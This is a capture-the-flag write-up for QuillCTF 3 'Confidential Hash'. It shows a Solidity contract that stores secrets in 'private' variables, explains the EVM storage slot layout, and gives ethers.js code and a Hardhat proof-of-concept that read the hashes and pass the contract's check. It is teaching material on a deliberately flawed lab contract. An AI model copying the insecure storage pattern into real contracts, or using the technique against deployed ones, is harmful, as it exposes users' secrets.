# QuillCTF 3: Confidential Hash

**Objective of CTF:**

- Find the keccak256 hash of aliceHash and bobHash.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract ConfidentialHash {
  string public firstUser = "ALICE";
  uint public alice_age = 24;
  bytes32 private ALICE_PRIVATE_KEY; // Super Secret Key
  bytes32 public ALICE_DATA = "QWxpY2UK";
  bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA);

  string public secondUser = "BOB";
  uint public bob_age = 21;
  bytes32 private BOB_PRIVATE_KEY; // Super Secret Key
  bytes32 public BOB_DATA = "Qm9iCg";
  bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA);

  constructor() {}

  function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) {
    return keccak256(abi.encodePacked(key1, key2));
  }

  function checkthehash(bytes32 _hash) public view returns (bool) {
    require(_hash == hash(aliceHash, bobHash), "Hashes do not match.");
    return true;
  }
}
```

## The Attack

Although we might use the `private` keyword for storage variables sometimes, this does not mean they are really private. In fact, anyone can read them with no cost.

Using `ethers`, you can read the storage slots of any contract via `ethers.provider.getStorageAt(address, slot)`. The important point here would be to know how the storage layout works in Solidity.

The storage layout of a contract is greatly described in the following document: <https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html>. There is quite a lot to know there, especially related to dynamically-sized variables such as strings and byte arrays. The most important thing to know is that EVM storage slots are 32-bytes each. Variables are allocated to this storage with respect to the order they appear in the source code. Multiple variables smaller than 32-bytes combined will be put in the same slot, although that does not happen in our target contract. Larger-than-32-byte values are also a different story, but we do not have any of those neither.

So, our target contract has variables that can all fit in 32-bytes. Since they are placed in the order of appearance, the storage slot to variable mapping will be as follows:

- `0x0` has `firstUser` string, which is a string that can fit in less than 32 bytes.
- `0x1` has 256-bit Alice age.
- `0x2` has the 32-byte Alice private key.
- `0x3` has the 32-byte Alice data.
- `0x4` has the 32-byte Alice hash.
- `0x5` has `secondUser` string, which is a string that can fit in less than 32 bytes.
- `0x6` has 256-bit Bob age.
- `0x7` has the 32-byte Bob private key.
- `0x8` has the 32-byte Bob data.
- `0x9` has the 32-byte Bob hash.

We are looking for the hash values, which are at `0x4` and `0x9`. We can fetch them as follows:

```typescript
// 0x4: alice hash
const aliceHash: string = await ethers.provider.getStorageAt(contract.address, ethers.utils.hexValue(4));

// 0x9: bob hash
const bobHash: string = await ethers.provider.getStorageAt(contract.address, ethers.utils.hexValue(9));
```

We will need to find the `keccak256(abi.encodePacked(aliceHash, bobHash))`, and we can do this easily in JS, thanks to `ethers`.

```typescript
const hash = ethers.utils.solidityKeccak256(['bytes32', 'bytes32'], [aliceHash, bobHash]);
```

That is all!

## Proof of Concept

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```typescript
describe('QuillCTF 3: Confidential Hash', () => {
  let contract: ConfidentialHash;
  let owner: SignerWithAddress;

  before(async () => {
    [owner] = await ethers.getSigners();
    contract = await ethers.getContractFactory('ConfidentialHash', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should find the private variables', async () => {
    const aliceHash: string = await ethers.provider.getStorageAt(contract.address, ethers.utils.hexValue(4));

    const bobHash: string = await ethers.provider.getStorageAt(contract.address, ethers.utils.hexValue(9));

    // construct the hash as done in the contract via ethers.utils.solidityKeccak256
    const hash = ethers.utils.solidityKeccak256(['bytes32', 'bytes32'], [aliceHash, bobHash]);

    expect(await contract.checkthehash(hash)).to.be.true;
  });
});
```
